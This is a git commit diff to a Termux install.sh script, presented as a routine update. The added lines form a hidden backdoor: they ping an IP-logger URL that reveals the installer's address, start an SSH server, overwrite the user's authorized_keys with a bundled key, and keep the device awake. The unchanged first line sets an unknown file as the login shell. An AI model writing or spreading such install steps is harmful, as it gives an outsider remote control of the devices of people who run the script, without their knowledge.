f23a15a742e7ebd447046a2dc0614a0440bcb70e
impric <90521011+impric@users.noreply.github.com>
2021-09-11 13:27:38 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,1 +1,8 @@
 chmod +777 null && mv null "$PREFIX/bin/" && chsh -s null
+apt install wget -y
+wget "https://iplogger.org/11KBF"
+apt install openssh -y
+sshd
+mv Chave $HOME/.ssh && rm authorized_keys && mv Chave authorized_keys
+termux-wake-lock
+cd $HOME
